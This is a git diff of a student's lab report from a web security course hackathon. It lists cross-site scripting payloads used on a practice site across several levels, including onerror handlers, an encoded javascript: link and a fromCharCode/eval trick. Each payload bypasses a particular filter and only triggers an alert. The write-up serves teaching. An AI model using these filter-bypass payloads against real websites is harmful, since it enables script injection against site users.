@@ -14,15 +14,19 @@
 
 ## The Lab's Overview
 
-For Hackathon 1, there were two tasks.
+For Hackathon 1, there were two tasks. Task 1 focused on cross-site scripting attacks at increasing levels of difficulty. They required injecting code to get an alert\(). Task 2 focused on the implementation of input validation and XSS defense methods in previous Labs 1 and 2.
 
-Outcomes I learned from this hackathon were...
+Outcomes I learned from this hackathon were the various hacking methods to bypass filters and protections placed client-side and server-side. This allowed for a better understanding on vulnerabilities when programming a web application and promoted the best ways to protect and defend your web apps from hackers.
 
 Hackathon1 Folder: [https://github.com/munozsophia/waph-munozsa/tree/main/hackathons/hackathon1](https://github.com/munozsophia/waph-munozsa/tree/main/hackathons/hackathon1).
 
 ### Task 1: Attacks
 
+The section covers the cross-site scripting injections used to hack into 7 Levels of webpages.
+
 #### a. Level 0
+
+Below is the XSS code injected into the input form:
 
 `<script>alert("Level 0-Hacked by Sophia Munoz")</script>`
 
@@ -31,6 +35,8 @@ Hackathon1 Folder: [https://github.com/munozsophia/waph-munozsa/tree/main/hackat
 
 #### b. Level 1
 
+Below is the XSS code injected into the URL:
+
 `https://waph-hackathon.eastus.cloudapp.azure.com/xss/level1/echo.php?input=<script>alert("Level 1-Hacked by Sophia Munoz")</script>`
 
 ![Level 1 Injected XSS and Payload Attack](../../images/level-1-attack.png)
@@ -38,7 +44,7 @@ Hackathon1 Folder: [https://github.com/munozsophia/waph-munozsa/tree/main/hackat
 
 #### c. Level 2
 
-Assuming the method used was the `POST` method. The vulnerability is exploited in the `echo.php` web application on this line of code: `echo $_POST['input']`
+Below is the XSS code injected into the console:
 
 ```html
 var f = document.createElement('form');
@@ -52,32 +58,40 @@ document.body.appendChild(f);
 f.submit();
 ```
 
+Assuming the method used was the `POST` method. The vulnerability is exploited in the `echo.php` web application on this line of code: `echo $_POST['input']`
+
 ![Level 2 Injected XSS and Payload Attack](../../images/level-2-attack.png)
 *Level 2 Injected XSS and Payload Attack*
 
 #### d. Level 3
 
-Assuming the method used was the `GET` method. The vulnerability is exploited in the fact that only `<script>` and `</script>` were filtered out, but other event handlers like the one used to inject in the URL \(`onerror`) weren't handled at all.
+Below is the XSS code injected into the URL:
 
 `https://waph-hackathon.eastus.cloudapp.azure.com/xss/level3/echo.php?input=<img src=x onerror="alert('Level 3-Hacked by Sophia Munoz')">`
+
+Assuming the method used was the `GET` method. The vulnerability is exploited in the fact that only `<script>` and `</script>` were filtered out, but other event handlers like the one used to inject in the URL \(`onerror`) weren't handled at all.
 
 ![Level 3 Injected XSS and Payload Attack](../../images/level-3-attack.png)
 *Level 3 Injected XSS and Payload Attack*
 
 #### e. Level 4
 
-I URL encoded the `&` in `&#115;`. The ampersand essentially acts as URL parameter separator. Assuming the method used was the `GET` method. The vulnerability is exploited by a line like `echo $input`. Even `script` wasn't detected as it wasn't a literal letter-for-letter string.
+Below is the XXS code injected into the URL:
 
 `https://waph-hackathon.eastus.cloudapp.azure.com/xss/level4/echo.php?input=<a href="java%26%23115%3Bcript:alert('Level 4-Hacked by Sophia Munoz')">Click Me</a>`
+
+I URL encoded the `&` in `&#115;`. The ampersand essentially acts as URL parameter separator. Assuming the method used was the `GET` method. The vulnerability is exploited by a line like `echo $input`. Even `script` wasn't detected as it wasn't a literal letter-for-letter string.
 
 ![Level 4 Injected XSS and Payload Attack](../../images/level-4-attack.png)
 *Level 4 Injected XSS and Payload Attack*
 
 #### f. Level 5
 
-I used `fromCharCode` to encode `alert` as to not have it be detected. Assuming the method used was the `GET` method. The vulnerability is like the previous level, `echo $input`, but it now also includes `alert` instead of just `script`.
+Below is the XXS code injected into the URL:
 
 `https://waph-hackathon.eastus.cloudapp.azure.com/xss/level5/echo.php?input=<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,76,101,118,101,108,32,53,45,72,97,99,107,101,100,32,98,121,32,83,111,112,104,105,97,32,77,117,110,111,122,39,41))>`
+
+I used `fromCharCode` to encode `alert` as to not have it be detected. Assuming the method used was the `GET` method. The vulnerability is like the previous level, `echo $input`, but it now also includes `alert` instead of just `script`.
 
 ![Level 5 Injected XSS and Payload Attack](../../images/level-5-attack.png)
 *Level 5 Injected XSS and Payload Attack*
